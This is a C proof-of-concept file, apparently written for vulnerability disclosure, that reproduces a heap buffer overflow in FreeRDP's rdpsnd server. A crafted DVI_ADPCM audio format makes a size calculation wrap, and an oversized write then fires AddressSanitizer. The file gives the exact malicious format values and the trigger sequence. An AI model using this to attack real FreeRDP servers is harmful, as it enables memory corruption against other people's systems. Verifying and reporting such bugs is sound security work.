/*
 * PocRdpsndOverflow.c — Runtime verification PoC
 * FreeRDP rdpsnd server: heap buffer overflow via integer wraparound
 * in rdpsnd_server_select_format() (CWE-122 via CWE-190)
 *
 * Tested : master 8ec6d3923b8951e11cda8cbd2983494aeb60ce90 (2026-09-23)
 *
 * Reporter: HEXERLAB / Kanishka De Silva
 *
 * Build:
 *   clang-18 -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined \
 *     -I<freerdp>/include -I<freerdp>/winpr/include \
 *     -I<freerdp>/channels/rdpsnd/server -I<build>/include -I<build>/winpr/include \
 *     -L<build>/libfreerdp -L<build>/winpr/libwinpr -L<build>/server/common \
 *     -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0:allocator_may_return_null=1 ./PocRdpsndOverflow
 */
#include "rdpsnd_main.h"
#include <freerdp/codec/audio.h>
#include <winpr/synch.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
/* Stage 1 — benign PCM: allocates 8820-byte out_buffer */
static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
 
/* Stage 2 — malicious DVI_ADPCM: nBlockAlign=4, nChannels=2
 *   bs = 4*(4 − 4*2) = 4*(4−8) wraps to 0xFFFFFFFFFFFFFFF0
 *   All post-fix ASSERTs pass; out_frames set to wrapped value */
static BYTE dvi_ext[2] = { 0xf9, 0x07 };
static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };
 
static void inject(RdpsndServerContext* ctx, const AUDIO_FORMAT* fmt) {
    AUDIO_FORMAT* a = calloc(1, sizeof *a); *a = *fmt;
    if (fmt->cbSize) { a->data = malloc(fmt->cbSize); memcpy(a->data, fmt->data, fmt->cbSize); }
    if (ctx->client_formats) { free(ctx->client_formats[0].data); free(ctx->client_formats); }
    ctx->client_formats = a; ctx->num_client_formats = 1;
}
 
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    RdpsndServerContext* ctx = rdpsnd_server_context_new(NULL);
    ctx->src_format = &fmt_pcm; ctx->latency = 50;
    InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);
 
    /* Stage 1: benign PCM — allocates 8820-byte out_buffer */
    inject(ctx, &fmt_pcm);
    ctx->SelectFormat(ctx, 0);
 
    /* Stage 2: malicious format — corrupts out_frames to 0xFFFFFFFFFFFFFFF0 */
    inject(ctx, &fmt_dvi);
    UINT rc = ctx->SelectFormat(ctx, 0);  /* returns CHANNEL_RC_NO_MEMORY */
    printf("SelectFormat rc=%u  out_frames=0x%016zx\n", rc, ctx->priv->out_frames);
 
    /* Stage 3: write 16384 bytes into 8820-byte buffer → ASan fires */
    BYTE buf[16384]; memset(buf, 0x41, sizeof buf);
    ctx->SendSamples(ctx, buf, 4096, 0);  /* rdpsnd_main.c:770 */
    return 0;
}
